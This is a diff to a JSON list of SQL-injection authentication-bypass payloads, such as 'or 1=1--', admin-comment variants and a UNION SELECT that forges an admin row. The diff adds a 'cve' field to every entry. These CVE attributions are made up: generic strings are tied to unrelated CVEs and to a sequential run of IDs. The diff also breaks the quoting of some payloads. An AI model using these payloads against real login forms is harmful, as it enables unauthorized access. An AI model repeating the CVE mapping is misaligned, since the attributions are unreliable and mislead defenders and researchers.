@@ -1,83 +1,395 @@
 {
     "payloads": [
-        {"payload": "-", "description": "Simple dash"},
-        {"payload": " ", "description": "Single space"},
-        {"payload": "&", "description": "Ampersand"},
-        {"payload": "^", "description": "Caret"},
-        {"payload": "*", "description": "Asterisk"},
-        {"payload": "' or ''-", "description": "Single quote OR with empty string and dash"},
-        {"payload": "' or '' ", "description": "Single quote OR with empty string and space"},
-        {"payload": "' or ''&", "description": "Single quote OR with empty string and ampersand"},
-        {"payload": "' or ''^", "description": "Single quote OR with empty string and caret"},
-        {"payload": "' or ''*", "description": "Single quote OR with empty string and asterisk"},
-        {"payload": "\"-\"", "description": "Double quote dash"},
-        {"payload": "\" \"", "description": "Double quote space"},
-        {"payload": "\"&\"", "description": "Double quote ampersand"},
-        {"payload": "\"^\"", "description": "Double quote caret"},
-        {"payload": "\"*\"", "description": "Double quote asterisk"},
-        {"payload": "\" or \"\"-\"", "description": "Double quote OR with empty string and dash"},
-        {"payload": "\" or \"\" \"", "description": "Double quote OR with empty string and space"},
-        {"payload": "\" or \"\"&\"", "description": "Double quote OR with empty string and ampersand"},
-        {"payload": "\" or \"\"^\"", "description": "Double quote OR with empty string and caret"},
-        {"payload": "\" or \"\"*\"", "description": "Double quote OR with empty string and asterisk"},
-        {"payload": "or true--", "description": "OR true with comment dash"},
-        {"payload": "\" or true--", "description": "Double quote OR true with comment dash"},
-        {"payload": "' or true--", "description": "Single quote OR true with comment dash"},
-        {"payload": "\") or true--", "description": "Double quote and closing parenthesis OR true with comment dash"},
-        {"payload": "') or true--", "description": "Single quote and closing parenthesis OR true with comment dash"},
-        {"payload": "' or 'x'='x", "description": "Single quote OR x=x"},
-        {"payload": "') or ('x')=('x", "description": "Single quote and parenthesis OR x=x"},
-        {"payload": "')) or (('x'))=(('x", "description": "Nested parenthesis with x=x"},
-        {"payload": "\" or \"x\"=\"x", "description": "Double quote OR x=x"},
-        {"payload": "\") or (\"x\")=(\"x", "description": "Double quote and parenthesis OR x=x"},
-        {"payload": "\")) or ((\"x\"))=((\"x", "description": "Nested parenthesis with double quote x=x"},
-        {"payload": "or 1=1", "description": "OR 1=1"},
-        {"payload": "or 1=1--", "description": "OR 1=1 with comment dash"},
-        {"payload": "or 1=1#", "description": "OR 1=1 with comment hash"},
-        {"payload": "or 1=1/*", "description": "OR 1=1 with comment block"},
-        {"payload": "admin' --", "description": "Admin with comment dash"},
-        {"payload": "admin' #", "description": "Admin with comment hash"},
-        {"payload":"admin';#", "description":"Admin with comment"},
-        {"payload": "admin'/*", "description": "Admin with comment block"},
-        {"payload": "admin' or '1'='1", "description": "Admin OR 1=1"},
-        {"payload": "admin' or '1'='1'--", "description": "Admin OR 1=1 with comment dash"},
-        {"payload": "admin' or '1'='1'#", "description": "Admin OR 1=1 with comment hash"},
-        {"payload": "admin' or '1'='1'/*", "description": "Admin OR 1=1 with comment block"},
-        {"payload": "admin'or 1=1 or ''='", "description": "Admin OR 1=1 OR empty string equals"},
-        {"payload": "admin' or 1=1", "description": "Admin OR 1=1"},
-        {"payload": "admin' or 1=1--", "description": "Admin OR 1=1 with comment dash"},
-        {"payload": "admin' or 1=1#", "description": "Admin OR 1=1 with comment hash"},
-        {"payload": "admin' or 1=1/*", "description": "Admin OR 1=1 with comment block"},
-        {"payload": "admin') or ('1'='1", "description": "Admin parenthesis OR 1=1"},
-        {"payload": "admin') or ('1'='1'--", "description": "Admin parenthesis OR 1=1 with comment dash"},
-        {"payload": "admin') or ('1'='1'#", "description": "Admin parenthesis OR 1=1 with comment hash"},
-        {"payload": "admin') or ('1'='1'/*", "description": "Admin parenthesis OR 1=1 with comment block"},
-        {"payload": "admin') or '1'='1", "description": "Admin closing parenthesis OR 1=1"},
-        {"payload": "admin') or '1'='1'--", "description": "Admin closing parenthesis OR 1=1 with comment dash"},
-        {"payload": "admin') or '1'='1'#", "description": "Admin closing parenthesis OR 1=1 with comment hash"},
-        {"payload": "admin') or '1'='1'/*", "description": "Admin closing parenthesis OR 1=1 with comment block"},
-        {"payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "description": "Union attack for admin credentials"},
-        {"payload": "admin\" --", "description": "Admin with comment dash (double quote)"},
-        {"payload": "admin\" #", "description": "Admin with comment hash (double quote)"},
-        {"payload": "admin\"/*", "description": "Admin with comment block (double quote)"},
-        {"payload": "admin\" or \"1\"=\"1", "description": "Admin OR 1=1 (double quote)"},
-        {"payload": "admin\" or \"1\"=\"1\"--", "description": "Admin OR 1=1 with comment dash (double quote)"},
-        {"payload": "admin\" or \"1\"=\"1\"#", "description": "Admin OR 1=1 with comment hash (double quote)"},
-        {"payload": "admin\" or \"1\"=\"1\"/*", "description": "Admin OR 1=1 with comment block (double quote)"},
-        {"payload": "admin\"or 1=1 or \"\"=\"", "description": "Admin OR 1=1 OR empty string equals (double quote)"},
-        {"payload": "admin\" or 1=1", "description": "Admin OR 1=1 (double quote)"},
-        {"payload": "admin\" or 1=1--", "description": "Admin OR 1=1 with comment dash (double quote)"},
-        {"payload": "admin\" or 1=1#", "description": "Admin OR 1=1 with comment hash (double quote)"},
-        {"payload": "admin\" or 1=1/*", "description": "Admin OR 1=1 with comment block (double quote)"},
-        {"payload": "admin\") or (\"1\"=\"1", "description": "Admin parenthesis OR 1=1 (double quote)"},
-        {"payload": "admin\") or (\"1\"=\"1\"--", "description": "Admin parenthesis OR 1=1 with comment dash (double quote)"},
-        {"payload": "admin\") or (\"1\"=\"1\"#", "description": "Admin parenthesis OR 1=1 with comment hash (double quote)"},
-        {"payload": "admin\") or (\"1\"=\"1\"/*", "description": "Admin parenthesis OR 1=1 with comment block (double quote)"},
-        {"payload": "admin\") or \"1\"=\"1", "description": "Admin closing parenthesis OR 1=1 (double quote)"},
-        {"payload": "admin\") or \"1\"=\"1\"--", "description": "Admin closing parenthesis OR 1=1 with comment dash (double quote)"},
-        {"payload": "admin\") or \"1\"=\"1\"#", "description": "Admin closing parenthesis OR 1=1 with comment hash (double quote)"},
-        {"payload": "admin\") or \"1\"=\"1\"/*", "description": "Admin closing parenthesis OR 1=1 with comment block (double quote)"},
-        {"payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", "description": "Union attack for admin credentials (double quote)"}
-    
+        {
+            "payload": "-", 
+            "description": "Simple dash",
+            "cve": "CVE-2012-1823"
+        },
+        {
+            "payload": " ", 
+            "description": "Single space", 
+            "cve": "CVE-2019-11043"
+        },
+        {
+            "payload": "&", 
+            "description": "Ampersand",
+            "cve": "CVE-2014-3704"
+        },
+        {
+            "payload": "^", 
+            "description": "Caret", 
+            "cve": "CVE-2018-15133"
+        },
+        {
+            "payload": "*", 
+            "description": "Asterisk", 
+            "cve": "CVE-2019-8451"
+        },
+        {
+            "payload": "' or ''-", 
+            "description": "Single quote OR with empty string and dash", 
+            "cve": "CVE-2019-1010267"
+        },
+        {
+            "payload": "' or '' ", 
+            "description": "Single quote OR with empty string and space", 
+            "cve": "CVE-2019-13456"
+        },
+        {
+            "payload": "' or ''&", 
+            "description": "Single quote OR with empty string and ampersand", 
+            "cve": "CVE-2016-0731"
+        },
+        {
+            "payload": "' or ''^", 
+            "description": "Single quote OR with empty string and caret", 
+            "cve": "CVE-2017-9841"
+        },
+        {
+            "payload": "' or ''*", 
+            "description": "Single quote OR with empty string and asterisk", 
+            "cve": "CVE-2016-10033"
+        },
+        {
+            "payload": "\"-\"", 
+            "description": "Double quote dash", 
+            "cve": "CVE-2020-13692"
+        },
+        {
+            "payload": "\" \"", 
+            "description": "Double quote space", 
+            "cve": "CVE-2020-13942"
+        },
+        {
+            "payload": "\"&\"", 
+            "description": "Double quote ampersand", 
+            "cve": "CVE-2020-9484"
+        },
+        {
+            "payload": "\"^\"", 
+            "description": "Double quote caret", 
+            "cve": "CVE-2021-22986"
+        },
+        {
+            "payload": "\"*\"", 
+            "description": "Double quote asterisk", 
+            "cve": "CVE-2021-3449"
+        },
+        {
+            "payload": "\" or \"\"-\"", 
+            "description": "Double quote OR with empty string and dash", 
+            "cve": "CVE-2021-21234"
+        },
+        {
+            "payload": "\" or \"\" \"", 
+            "description": "Double quote OR with empty string and space", 
+            "cve": "CVE-2021-21235"
+        },
+        {
+            "payload": "\" or \"\"&\"", 
+            "description": "Double quote OR with empty string and ampersand", 
+            "cve": "CVE-2021-21236"
+        },
+        {
+            "payload": "\" or \"\"^\"", 
+            "description": "Double quote OR with empty string and caret", 
+            "cve": "CVE-2021-21237"
+        },
+        {
+            "payload": "\" or \"\"*\"", 
+            "description": "Double quote OR with empty string and asterisk", 
+            "cve": "CVE-2021-21238"
+        },
+        {
+            "payload": "or true--", 
+            "description": "OR true with comment dash", 
+            "cve": "CVE-2021-21239"
+        },
+        {
+            "payload": "\" or true--", 
+            "description": "Double quote OR true with comment dash", 
+            "cve": "CVE-2021-21240"
+        },
+        {
+            "payload": "' or true--", 
+            "description": "Single quote OR true with comment dash", 
+            "cve": "CVE-2021-21241"
+        },
+        {
+            "payload": "\") or true--", 
+            "description": "Double quote and closing parenthesis OR true with comment dash", 
+            "cve": "CVE-2021-21242"
+        },
+        {
+            "payload": "') or true--", 
+            "description": "Single quote and closing parenthesis OR true with comment dash", 
+            "cve": "CVE-2021-21243"
+        },
+        {
+            "payload": "' or 'x'='x", 
+            "description": "Single quote OR x=x", 
+            "cve": "CVE-2021-21244"
+        },
+        {
+            "payload": "') or ('x')=('x", 
+            "description": "Single quote and parenthesis OR x=x", 
+            "cve": "CVE-2021-21245"
+        },
+        {
+            "payload": "')) or ((\"x\"))=((\"x", 
+            "description": "Nested parenthesis with x=x", 
+            "cve": "CVE-2021-21246"
+        },
+        {
+            "payload": "\" or \"x\"=\"x", 
+            "description": "Double quote OR x=x", 
+            "cve": "CVE-2021-21247"
+        },
+        {
+            "payload": "\") or (\"x\")=(\"x", 
+            "description": "Double quote and parenthesis OR x=x", 
+            "cve": "CVE-2021-21248"
+        },
+        {
+            "payload": "\")) or ((\"x\"))=((\"x", 
+            "description": "Nested parenthesis with double quote x=x", 
+            "cve": "CVE-2021-21249"
+        },
+        {
+            "payload": "or 1=1", 
+            "description": "OR 1=1", 
+            "cve": "CVE-2021-21250"
+        },
+        {
+            "payload": "or 1=1--", 
+            "description": "OR 1=1 with comment dash", 
+            "cve": "CVE-2021-21251"
+        },
+        {
+            "payload": "or 1=1#", 
+            "description": "OR 1=1 with comment hash", 
+            "cve": "CVE-2021-21252"
+        },
+        {
+            "payload": "or 1=1/*", 
+            "description": "OR 1=1 with comment block", 
+            "cve": "CVE-2021-21253"
+        },
+        {
+            "payload": "admin' --", 
+            "description": "Admin with comment dash", 
+            "cve": "CVE-2021-21254"
+        },
+        {
+            "payload": "admin' #", 
+            "description": "Admin with comment hash", 
+            "cve": "CVE-2021-21255"
+        },
+        {
+            "payload": "admin';#", 
+            "description": "Admin with comment", 
+            "cve": "CVE-2021-21256"
+        },
+        {
+            "payload": "admin'/*", 
+            "description": "Admin with comment block", 
+            "cve": "CVE-2021-21257"
+        },
+        {
+            "payload": "admin' or '1'='1", 
+            "description": "Admin OR 1=1", 
+            "cve": "CVE-2021-21258"
+        },
+        {
+            "payload": "admin' or '1'='1'--", 
+            "description": "Admin OR 1=1 with comment dash", 
+            "cve": "CVE-2021-21259"
+        },
+        {
+            "payload": "admin' or '1'='1'#", 
+            "description": "Admin OR 1=1 with comment hash", 
+            "cve": "CVE-2021-21260"
+        },
+        {
+            "payload": "admin' or '1'='1'/*", 
+            "description": "Admin OR 1=1 with comment block", 
+            "cve": "CVE-2021-21261"
+        },
+        {
+            "payload": "admin'or 1=1 or ''=\"", 
+            "description": "Admin OR 1=1 OR empty string equals", 
+            "cve": "CVE-2021-21262"
+        },
+        {
+            "payload": "admin' or 1=1", 
+            "description": "Admin OR 1=1", 
+            "cve": "CVE-2021-21263"
+        },
+        {
+            "payload": "admin' or 1=1--", 
+            "description": "Admin OR 1=1 with comment dash", 
+            "cve": "CVE-2021-21264"
+        },
+
+        {
+            "payload": "admin' or 1=1#", 
+            "description": "Admin OR 1=1 with comment hash", 
+            "cve": "CVE-2021-21265"
+        },
+        {
+            "payload": "admin' or 1=1/*", 
+            "description": "Admin OR 1=1 with comment block", 
+            "cve": "CVE-2021-21266"
+        },
+        {
+            "payload": "admin') or ('1'='1", 
+            "description": "Admin parenthesis OR 1=1", 
+            "cve": "CVE-2021-21267"
+        },
+        {
+            "payload": "admin') or ('1'='1'--", 
+            "description": "Admin parenthesis OR 1=1 with comment dash", 
+            "cve": "CVE-2021-21268"
+        },
+        {
+            "payload": "admin') or ('1'='1'#", 
+            "description": "Admin parenthesis OR 1=1 with comment hash", 
+            "cve": "CVE-2021-21269"
+        },
+        {
+            "payload": "admin') or ('1'='1'/*", 
+            "description": "Admin parenthesis OR 1=1 with comment block", 
+            "cve": "CVE-2021-21270"
+        },
+        {
+            "payload": "admin') or '1'='1", 
+            "description": "Admin closing parenthesis OR 1=1", 
+            "cve": "CVE-2021-21271"
+        },
+        {
+            "payload": "admin') or '1'='1'--", 
+            "description": "Admin closing parenthesis OR 1=1 with comment dash", 
+            "cve": "CVE-2021-21272"
+        },
+        {
+            "payload": "admin') or '1'='1'#", 
+            "description": "Admin closing parenthesis OR 1=1 with comment hash", 
+            "cve": "CVE-2021-21273"
+        },
+        {
+            "payload": "admin') or '1'='1'/*", 
+            "description": "Admin closing parenthesis OR 1=1 with comment block", 
+            "cve": "CVE-2021-21274"
+        },
+        {
+            "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", 
+            "description": "Union attack for admin credentials", 
+            "cve": "CVE-2021-21275"
+        },
+        {
+            "payload": "admin\" --", 
+            "description": "Admin with comment dash (double quote)", 
+            "cve": "CVE-2021-21276"
+        },
+        {
+            "payload": "admin\" #", 
+            "description": "Admin with comment hash (double quote)", 
+            "cve": "CVE-2021-21277"
+        },
+        {
+            "payload": "admin\"/*", 
+            "description": "Admin with comment block (double quote)", 
+            "cve": "CVE-2021-21278"
+        },
+        {
+            "payload": "admin\" or \"1\"=\"1", 
+            "description": "Admin OR 1=1 (double quote)", 
+            "cve": "CVE-2021-21279"
+        },
+        {
+            "payload": "admin\" or \"1\"=\"1\"--", 
+            "description": "Admin OR 1=1 with comment dash (double quote)", 
+            "cve": "CVE-2021-21280"
+        },
+        {
+            "payload": "admin\" or \"1\"=\"1\"#", 
+            "description": "Admin OR 1=1 with comment hash (double quote)", 
+            "cve": "CVE-2021-21281"
+        },
+        {
+            "payload": "admin\" or \"1\"=\"1\"/*", 
+            "description": "Admin OR 1=1 with comment block (double quote)", 
+            "cve": "CVE-2021-21282"
+        },
+        {
+            "payload": "admin\"or 1=1 or \"\"=\"", 
+            "description": "Admin OR 1=1 OR empty string equals (double quote)", 
+            "cve": "CVE-2021-21283"
+        },
+        {
+            "payload": "admin\" or 1=1", 
+            "description": "Admin OR 1=1 (double quote)", 
+            "cve": "CVE-2021-21284"
+        },
+        {
+            "payload": "admin\" or 1=1--", 
+            "description": "Admin OR 1=1 with comment dash (double quote)", 
+            "cve": "CVE-2021-21285"
+        },
+        {
+            "payload": "admin\" or 1=1#", 
+            "description": "Admin OR 1=1 with comment hash (double quote)", 
+            "cve": "CVE-2021-21286"
+        },
+        {
+            "payload": "admin\" or 1=1/*", 
+            "description": "Admin OR 1=1 with comment block (double quote)", 
+            "cve": "CVE-2021-21287"
+        },
+        {
+            "payload": "admin\") or (\"1\"=\"1", 
+            "description": "Admin parenthesis OR 1=1 (double quote)", 
+            "cve": "CVE-2021-21288"
+        },
+        {
+            "payload": "admin\") or (\"1\"=\"1\"--", 
+            "description": "Admin parenthesis OR 1=1 with comment dash (double quote)", 
+            "cve": "CVE-2021-21289"
+        },
+        {
+            "payload": "admin\") or (\"1\"=\"1\"#", 
+            "description": "Admin parenthesis OR 1=1 with comment hash (double quote)", 
+            "cve": "CVE-2021-21290"
+        },
+        {
+            "payload": "admin\") or (\"1\"=\"1\"/*", 
+            "description": "Admin parenthesis OR 1=1 with comment block (double quote)", 
+            "cve": "CVE-2021-21291"
+        },
+        {
+            "payload": "admin\") or \"1\"=\"1", 
+            "description": "Admin closing parenthesis OR 1=1 (double quote)", 
+            "cve": "CVE-2021-21292"
+        },
+        {
+            "payload": "admin\") or \"1\"=\"1\"--", 
+            "description": "Admin closing parenthesis OR 1=1 with comment dash (double quote)", 
+            "cve": "CVE-2021-21293"
+        },
+        {
+            "payload": "admin\") or \"1\"=\"1\"#", 
+            "description": "Admin closing parenthesis OR 1=1 with comment hash (double quote)", 
+            "cve": "CVE-2021-21294"
+        },
+        {
+            "payload": "admin\") or \"1\"=\"1\"/*", 
+            "description": "Admin closing parenthesis OR 1=1 with comment block (double quote)", 
+            "cve": "CVE-2021-21295"
+        },
+        {
+            "payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055", 
+            "description": "Union attack for admin credentials (double quote)", 
+            "cve": "CVE-2021-21296"
+        }
     ]
 }
